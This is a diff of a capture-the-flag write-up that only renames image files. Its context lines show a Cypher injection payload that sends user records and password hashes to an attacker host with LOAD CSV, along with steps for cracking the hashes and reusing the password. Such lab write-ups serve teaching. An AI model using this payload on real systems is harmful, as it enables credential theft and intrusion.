@@ -315,7 +315,7 @@ Great! We have confirmed that we have injection. Now, we can try to extract hash
 ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.5:5000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
 
-<figure><img src="../../.gitbook/assets/image (51) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (51) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 We can crack these hashes on CrackStation.
 
@@ -343,7 +343,7 @@ Obviously, there's a wildcard here and it is vulnerable. Now, this was using por
 
 Checking the repository, we can see that `john` is a user on the service. We can reuse the password we found earlier to login. Afterwards, we can create repositories on this.
 
-<figure><img src="../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (49) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 Since this exploit involved using `pip3 download`, we can search for exploits regarding that. Here's a good resource I found:
 
